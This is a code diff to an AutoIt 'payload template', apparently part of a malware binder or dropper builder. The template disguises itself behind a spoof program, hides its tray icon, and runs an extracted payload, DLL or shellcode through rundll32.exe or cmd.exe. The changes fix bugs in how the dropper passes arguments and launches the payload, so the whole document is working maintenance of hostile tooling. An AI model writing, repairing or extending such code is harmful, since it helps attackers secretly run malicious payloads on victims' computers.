@@ -1,4 +1,4 @@
-;Payload Template Version: 0.6.0a
+;Payload Template Version: 0.7.0a
 
 ;String Format Placeholder values
 ; 0  - #RequireAdmin pre-processor
@@ -13,7 +13,7 @@
 ; 9 - Type of payload (integer | 0 = payload / 1 = dll payload / 2 = shell code)
 
 #NoTrayIcon
-{0} 
+{0}
 
 Global $arguments = "{1}"
 Global $cmd = {2}
@@ -25,13 +25,15 @@ Global $showwin = {7}
 Global $conswitch = "{8}"
 Global $payloadtype = {9}
 Global $drive = StringLeft(@ScriptDir, 3)
-Global $spoofarguments, $payloadtarget, $spooftarget
+Global $spoofarguments = "", $payloadtarget, $spooftarget
 
 ;Initialization
 
-for $i = 1 to $Cmdline[0]
-    $spoofarguments &= " " & $Cmdline[$i]
-next
+If $Cmdline[0] > 0 Then
+    for $i = 1 to $Cmdline[0]
+        $spoofarguments &= " " & $Cmdline[$i]
+    next
+EndIf
 
 If $drive = "C:\" Then
     extractSpoof(true)
@@ -73,7 +75,7 @@ Func extractPayload()
             EndIf
         Case 1 ;DLL type payload mode
             $executetarget = "rundll32.exe"
-            $prearguments = $payloadtarget & ', ' $ $arguments
+            $prearguments = $payloadtarget & ', ' & $arguments
         Case 2 ;Shell code
             $executetarget = "cmd.exe"
             $prearguments = "/c " & $arguments
